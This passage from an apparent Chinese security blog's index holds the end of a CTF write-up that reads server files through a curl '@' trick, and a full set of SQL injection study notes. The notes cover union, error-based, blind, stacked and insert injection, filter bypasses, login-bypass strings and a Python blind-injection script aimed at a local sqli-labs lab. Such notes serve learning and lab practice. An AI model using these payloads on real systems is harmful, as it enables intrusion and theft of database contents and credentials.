发现任意一个宽字符，都会出现报错信息<br><em>这道题有关一个 djiango 特性和 php 特性，没看懂。</em></p></blockquote><ul><li>解题步骤：<br>playload1：?url=%80, 发现报错，url 编码使用的是 16 进制，80 也就是 128，ASCII 码是从 0-127，所以这个时候会报错。<br><strong>php 特性</strong>：<br>WP 得知 php 的 curl 组件请求加上 @会读取文件，读取 settings.py 文件获取数据库名称</li><li>构造 playload2：<br>?url=@/opt/api/api/settings.py <em>读取配置文件</em><br> Ctrl+f 搜索 database</li><li>构造 playload3：<br>?url=@/opt/api/database.sqlite3<br> <code>搜索flag/ctf可得flag</code> <br> <code>最后的flag竟然不包含前面的A</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/03/25/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/25/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="从0开始的sql注入"><a class="markdownIt-Anchor" href="#从0开始的sql注入">#</a> <strong>从 0 开始的 sql 注入</strong></h1><h2 id="burpsuite-fuzz"><a class="markdownIt-Anchor" href="#burpsuite-fuzz">#</a> burpsuite fuzz</h2><ul><li>Fuzz testing 是生成大量数据并且对系统产生大量异常请求，通过大量恶意请求查找漏洞。在这个过程中我们可以依赖于部分工具来实现参数化，本文以 burpsuite 为工具以文件上传为例，可用此爆破过滤的关键字</li><li>遇到的问题：<br>在爆破时遇到报错：Too Many Reqests!<br> 将线程数改为 1，时间间隔改小一点</li></ul><h2 id="查询所有数据"><a class="markdownIt-Anchor" href="#查询所有数据">#</a> 查询所有数据：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1</span><br></pre></td></tr></table></figure><h2 id="常用语句"><a class="markdownIt-Anchor" href="#常用语句">#</a> 常用语句</h2><ul><li>常用函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database()//查询数据库</span><br><span class="line">user()//当前数据库用户名</span><br><span class="line">version()//MySQL 版本</span><br></pre></td></tr></table></figure><ul><li>爆表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><ul><li>爆字段名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><ul><li>相应字段内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from users --+</span><br></pre></td></tr></table></figure><h2 id="1sql基本语法"><a class="markdownIt-Anchor" href="#1sql基本语法">#</a> 1.sql 基本语法</h2><h3 id="11-sql-select"><a class="markdownIt-Anchor" href="#11-sql-select">#</a> 1.1 sql select</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1,column2 <span class="keyword">from</span> table_name;     <span class="operator">/</span><span class="operator">/</span>从表中选取列</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name;       <span class="operator">/</span><span class="operator">/</span>从表中选取所有列</span><br></pre></td></tr></table></figure><p><em>column：(列) 字段名</em></p><h3 id="12-where子句"><a class="markdownIt-Anchor" href="#12-where子句">#</a> 1.2 where 子句</h3><ul><li>WHERE 子句用于提取那些满足指定条件的记录。</li></ul><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> websites <span class="keyword">where</span> coutry <span class="operator">=</span> <span class="string">&#x27;CN&#x27;</span>;</span><br></pre></td></tr></table></figure><p><em>字符要用单引号括起来，数字不用</em></p><h3 id="13-and-or运算符"><a class="markdownIt-Anchor" href="#13-and-or运算符">#</a> 1.3 AND &amp; OR 运算符</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>and</td><td>显示两个条件都成立的记录</td></tr><tr><td>or</td><td>两个条件只要有一个成立，就显示其记录</td></tr></tbody></table><h3 id="14-order-by"><a class="markdownIt-Anchor" href="#14-order-by">#</a> 1.4 order by</h3><ul><li>ORDER BY 关键字用于对结果集进行排序。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table_name <span class="keyword">ORDER</span> <span class="keyword">BY</span> column1, column2, ... <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p><strong>column1,column2</strong>: 要排序的字段名<br><strong> ASC</strong>：表示按升序排序。<br><strong>DESC</strong>：表示按降序排序。<br><em>默认为升序</em></p><h2 id="2-mysql知识点"><a class="markdownIt-Anchor" href="#2-mysql知识点">#</a> 2. mysql 知识点</h2><table><thead><tr></tr></thead><tbody><tr><td>union select</td><td>联合查询，判断哪些地方可被替代，并在网页上显示出来</td></tr><tr><td>database()</td><td>回显当前数据库</td></tr><tr><td>version()</td><td>查看当前竖起来版本</td></tr><tr><td>group_concat()</td><td>把产生的同一分组中的值用，连接，形成一个字符串</td></tr><tr><td>information_schema</td><td>存了很多 mysql 信息的数据库</td></tr></tbody></table><h3 id="联合查询"><a class="markdownIt-Anchor" href="#联合查询">#</a> 联合查询：</h3><p>当联合查询的数据不存在时就会创造一个虚拟数据，如：</p><p><img src="C:%5CUsers%5Cdell%5CDesktop%5C%E7%AC%94%E8%AE%B0%5C7e5d981f76a54e22b2ce3b6a13287b46.png" alt="7e5d981f76a54e22b2ce3b6a13287b46"><br> 若后端查询语句是先通过查询用户名再进行密码的判断，就可以生成一个虚拟的密码，然后就可以通过查询的虚拟数据生成的密码来登录</p><ul><li>通常密码被 md5 加密，可传入 md5 加密后的密码</li></ul><h2 id="23可以代替"><a class="markdownIt-Anchor" href="#23可以代替">#</a> <strong>%23 可以代替#</strong></h2><p><strong>information_schema.schemata</strong>        information_schema 库的一个表，名为 schemata, 存储数据库名的</p><ul><li><strong>schema_name</strong>:schemata 表中存储 mysql 所有数据库名字的字段</li></ul><hr><p><strong>information_schema.tables</strong> 存了 mysql 所有的表名</p><ul><li>TABLE_SCHEMA 表示表所属的数据库名称；</li><li>TABLE_NAME 表示所属的表的名称</li></ul><hr><p><strong>information_schema.columns</strong>  表存了所有的列的信息</p><ul><li>COLUMN_NAME 表示字段名，当你知道一个表的名字时，可通过此字段获得表中的所有字段名 (列名)</li></ul><hr><ul><li>关于 and 1=2  <strong>用来判断是数字型注入还是字符型注入</strong><br> <code>若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入。</code> <br> <code>若id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是数字型注入。</code></li></ul><h2 id="3搜索型注入"><a class="markdownIt-Anchor" href="#3搜索型注入">#</a> 3. 搜索型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select from 表名 where username like &#x27; %k% &#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>构造闭合：%’</li></ul><h2 id="4insert注入"><a class="markdownIt-Anchor" href="#4insert注入">#</a> 4.insert 注入</h2><ul><li>语句：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;必填字段&#x27;,&#x27;必填字段&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,)</span><br></pre></td></tr></table></figure><ul><li>playload:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h2 id="5盲注"><a class="markdownIt-Anchor" href="#5盲注">#</a> 5. 盲注</h2><h3 id="31报错注入"><a class="markdownIt-Anchor" href="#31报错注入">#</a> 3.1 报错注入</h3><ul><li>delete/update/insert</li><li>使用条件：页面有数据库的报错信息</li><li>判断是否报错</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; -- a</span><br></pre></td></tr></table></figure><h4 id="相关知识"><a class="markdownIt-Anchor" href="#相关知识">#</a> 相关知识：</h4><ul><li><strong>updatexml</strong><br>updatexml(xml_doument,XPath_string,new_value)<br> 第一个参数：XML 的内容<br>第二个参数：是需要 update 的位置 XPATH 路径<br>第三个参数：是更新后的内容<br>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式</li><li>0x7e 为符号’~'，因为不符合 xpath 语法，因此会报错，并把校验失败的东西爆出来。</li></ul><hr><ul><li>一些名词<br> <code>column_name:列的名称</code> <br> <code>Information_schema.columns:表示所有的列的信息</code> <br> <code>Information_schema:表示所有信息，包括库、表、列</code> <br> <code>Information_schema.tables:表示所有的表的信息</code> <br> <code>table_schema:数据库的名称</code> <br> <code>table_name:表的名称</code></li></ul><hr><ul><li><strong>注入方式：</strong></li><li>查库</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updataxml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>查表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (group_concat(table_name)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>查列名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (group_concat(column_name)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>查 flag 列内容</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (group_concat(flag)) <span class="keyword">from</span> sqli.flag ),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="长度限制"><a class="markdownIt-Anchor" href="#长度限制">#</a> 长度限制</h4><ul><li>limit：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) -- a//limit 0,1为展示第0条数据</span><br></pre></td></tr></table></figure><ul><li>substr():</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)</span><br><span class="line">from mysql.user), 1 , 31)),3) -- a</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注">#</a> 布尔盲注</h3><ul><li>特征：<br>1. 没有报错信息<br> 2. 不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是 0 或者 1)<br> 3. 在正确的输入下，输入 and 1=1/and 1= 2 发现可以判断<br> 4. 步骤：</li><li>用？id=1’ and 1=1–+ 和？id=1’ and 1=2–+ 验证</li><li>获取长度</li><li>一个一个猜测 flag 的内容：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="built_in">ascii</span>(substr((select(flag)<span class="keyword">from</span>(flag)),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">102</span>),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>if () 第一个参数为真，则返回 1，假则返回 0<br>substr (a,1,1) 表示从第一个字符开始，截取一个字符</p></blockquote><ul><li>其他可用函数：<br>left()：</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)  //前8个字符</span><br></pre></td></tr></table></figure><p>mid()</p><ul><li><p>2 分法脚本：</p><p>ascii () 参数是布尔值则返回 true 或 false</p><p>一下示例为获取数据库名</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbname</span>():</span><br><span class="line">    db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="comment"># 这个遍历是数据库名字的长度如果不够的话就一点一点猜测</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">            <span class="comment"># 32~127是ascii值对应的字符</span></span><br><span class="line">            payload = <span class="string">&quot;and ascii(substr(database(),%d,1))&gt;%d --+&quot;</span> % (i, mid)</span><br><span class="line">            url1 = url + payload        <span class="comment"># 获取url（原url+sql语句构造的url）</span></span><br><span class="line">            res = requests.get(url1)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        db_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;数据库名称为:&quot;</span> + db_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_dbname()</span><br></pre></td></tr></table></figure><h4 id="没过滤和单引号"><a class="markdownIt-Anchor" href="#没过滤和单引号">#</a> 没过滤 | 和单引号’</h4><ul><li>playload：用户名是字符串，要用’' 包起来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">payload=&quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(i,mid)</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注">#</a> 时间盲注</h3><ul><li>判断时间盲注：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(3) --+</span><br></pre></td></tr></table></figure><h2 id="6数据不在数据库中"><a class="markdownIt-Anchor" href="#6数据不在数据库中">#</a> 6. 数据不在数据库中</h2><ul><li><code>知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据</code></li><li><code>修改id=0或id=-1</code></li><li>使用 if () 语句，若条件正确则有明显延迟</li></ul><h2 id="7cookie注入"><a class="markdownIt-Anchor" href="#7cookie注入">#</a> 7.cookie 注入</h2><ul><li>使用 burpsuite</li><li><code>refer注入：直接在请求中写入**referer:**</code></li><li><code>http refer: HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</code></li></ul><h2 id="8堆叠注入"><a class="markdownIt-Anchor" href="#8堆叠注入">#</a> 8. 堆叠注入</h2><ul><li>使用情况：过滤了 select</li></ul><h3 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法">#</a> 基本语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from words;#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`;#   // (字符串为表名操作时要加反引号)</span><br></pre></td></tr></table></figure><ul><li>输入：</li></ul><blockquote><p>1’ union select 1,2#</p></blockquote><ul><li>发现过滤 select，堆叠注入。以下为 show 函数用法：</li></ul><blockquote><p>show databases// 列出服务器可访问的数据库<br> show tables// 显示该数据库内相关表的名称<br> show columns from tablename；// 显示表 tablename 的字段、字段类型、键值信息、是否可以用 null、默认值及其他信息。</p></blockquote><ul><li><strong>表名为数字时要用反引号括起来</strong></li></ul><h3 id="爆出字段名后"><a class="markdownIt-Anchor" href="#爆出字段名后">#</a> 爆出字段名后</h3><ul><li>将：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from`1919810931114514`</span><br></pre></td></tr></table></figure><p>进行 16 进制编码</p><ul><li>构造 playload：</li></ul><blockquote><p>;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p></blockquote><hr><ul><li>prepare…from… 是预处理语句，会进行编码转换。</li><li>execute 用来执行由 SQLPrepare 创建的 SQL 语句。</li><li>SELECT 可以在一条语句里对多个变量同时赋值，而 SET 只能一次对一个变量赋值。</li><li><code>将@a赋值为16进制编码后的语句，再将@a中的语句转换后给execsqp，执行execsql中的语句</code></li></ul><hr><h3 id="handler语句"><a class="markdownIt-Anchor" href="#handler语句">#</a> handler 语句</h3><blockquote><p>handler 是 mysql 的专用语句，没有包含到 SQL 标准中，但它每次只能查询 1 次记录，而 select 可以根据需要返回多条查询结果。<br>hander  <code>表名</code>  open;           // 打开一个表<br> handler <code>表名</code>  read frist;      // 查询第一个数据<br> handler <code>表名</code>  read next;     // 查询之后的数据直到最后一个数据返回空</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler`1919810931114514` open;handler`1919810931114514`read next;</span><br></pre></td></tr></table></figure><h2 id="9万能密码"><a class="markdownIt-Anchor" href="#9万能密码">#</a> 9. 万能密码:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>输入账号密码</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t_user <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>用 or 1=1 使 where 条件恒为 true</li></ul><h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤">#</a> 过滤</h2><ul><li>过滤空格，{}：$IFS</li><li>过滤 flag：</li><li>将关键字 replace 为空格，使用双写绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9`ls` //`ls`可以输出查询结果的内容</span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a class="markdownIt-Anchor" href="#双写绕过">#</a> 双写绕过：</h2><ul><li>playload:(check.php)?username=‘oorr 1=1%23&amp;password=’<br> <code>%23为注释，注释掉后面的password，因此password可以随便写;注意先单引号闭合</code></li></ul><h2 id="10post注入"><a class="markdownIt-Anchor" href="#10post注入">#</a> 10.post 注入</h2><ul><li>常产生地方：登录框（less-11）</li><li>数据包提交方式为 post</li><li>此处注释用 #或者–</li></ul><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集">#</a> 信息搜集</h2><blockquote><p>如果我们输入 &quot;%&quot; 或者 &quot;%1<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mo separator="true">,</mo><mo>¨</mo></mover><mtext>他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么</mtext><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">\&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&quot;%\&quot;,&quot;%1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mpunct">,</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">¨</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mord cjk_fallback">他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么</span><span class="mord">&quot;</span></span></span></span>&quot; 就因为没有经过任何处理而被替换为空。如果 %1$ + 非 arg 格式类型，程序会无法识别占位符类型，变为空</p></blockquote><p>做题时遇到了函数 addslashes ()，会在单引号前面加 / 无法用单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=1&amp;pass=%1$&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
